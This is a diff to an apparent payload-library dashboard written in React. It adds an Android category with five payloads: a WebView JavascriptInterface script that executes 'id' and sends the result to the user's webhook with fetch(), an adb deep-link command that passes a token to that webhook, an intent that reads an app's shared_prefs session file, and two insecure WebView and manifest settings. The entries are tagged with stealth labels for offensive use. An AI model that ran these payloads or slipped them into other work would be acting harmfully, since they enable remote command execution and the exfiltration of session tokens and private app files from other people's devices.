@@ -1168,6 +1168,52 @@ export default function DashboardPage({ params }) {
           tech: '.NET Framework / C#'
         }
       ]
+    },
+    {
+      category: 'ANDROID',
+      title: 'Android Vulnerability Testing (Deep Links, Intents, WebViews)',
+      items: [
+        { 
+          title: 'Android WebView JavaScriptInterface Bridge Remote Code Execution', 
+          code: `<script>if(window.Android) { const res = window.Android.executeCommand("id"); fetch('${webhookUrl}/?android_bridge=' + encodeURIComponent(res)); }</script>`, 
+          desc: 'Exploits insecurely exposed Java classes inside Android WebViews annotated with @JavascriptInterface to exfiltrate execution output back to your listener.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Android SDK / Java WebView'
+        },
+        { 
+          title: 'Android Deep Link Hijacking Scheme Exfiltration', 
+          code: `adb shell am start -W -a android.intent.action.VIEW -d "myapp://credentials?token=exfiltrated_key&redirect=${webhookUrl}"`, 
+          desc: 'Simulates a deep-link hijack via Android ADB shell. Intercepts private access tokens and broadcasts them to your external webhook receiver.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Android OS / ADB Shell'
+        },
+        { 
+          title: 'Android Intent Redirection Private File Extraction', 
+          code: `Intent i = new Intent(); i.setClassName("com.target.app", "com.target.app.WebViewActivity"); i.putExtra("url", "file:///data/data/com.target.app/shared_prefs/user_session.xml"); i.putExtra("callback", "${webhookUrl}");`, 
+          desc: 'C# / Java Android mock payload targeting unprotected exported activities to force-read internal application shared preferences and broadcast outwards.',
+          priority: 'HIGH', 
+          era: '2026 Stealth',
+          tech: 'Android Java / Kotlin'
+        },
+        { 
+          title: 'Android WebView Local File Access Overriding (LFA)', 
+          code: `webView.getSettings().setAllowFileAccess(true); webView.getSettings().setAllowUniversalAccessFromFileURLs(true);`, 
+          desc: 'Critical misconfiguration in Android WebViews allowing attackers to use file:// URLs to read arbitrary local app files and perform cross-origin requests.',
+          priority: 'MEDIUM', 
+          era: 'Standard Bypass',
+          tech: 'Android WebView Settings'
+        },
+        { 
+          title: 'Android Cleartext Traffic Insecure Permissive Policy', 
+          code: `<application android:usesCleartextTraffic="true"> ... </application>`, 
+          desc: 'Detects lack of SSL/TLS transport security in Android manifest, facilitating active interceptor logging of requests on standard HTTP protocol.',
+          priority: 'LOW', 
+          era: 'Zaman Batu (Classic)',
+          tech: 'Android Manifest XML'
+        }
+      ]
     }
   ];
 
@@ -1459,7 +1505,7 @@ export default function DashboardPage({ params }) {
               <span style={{ fontSize: '0.75rem', fontWeight: '750', color: 'var(--text-muted)', textTransform: 'uppercase', paddingLeft: '6px', marginBottom: '4px' }}>
                 Categories
               </span>
-              {['ALL', 'XSS', 'SQLI', 'RCE', 'XXE', 'LFI', 'SSTI', 'LANG'].map(cat => (
+              {['ALL', 'XSS', 'SQLI', 'RCE', 'XXE', 'LFI', 'SSTI', 'LANG', 'ANDROID'].map(cat => (
                 <button
                   key={cat}
                   onClick={() => setSelectedPayloadCategory(cat)}
@@ -1496,6 +1542,8 @@ export default function DashboardPage({ params }) {
                       ? '📂 View All Payloads' 
                       : cat === 'LANG' 
                       ? '💻 Go / Python / JVM / Node' 
+                      : cat === 'ANDROID'
+                      ? '📱 Android (WebViews/Links)'
                       : `☣️ ${cat}`}
                   </span>
                 </button>
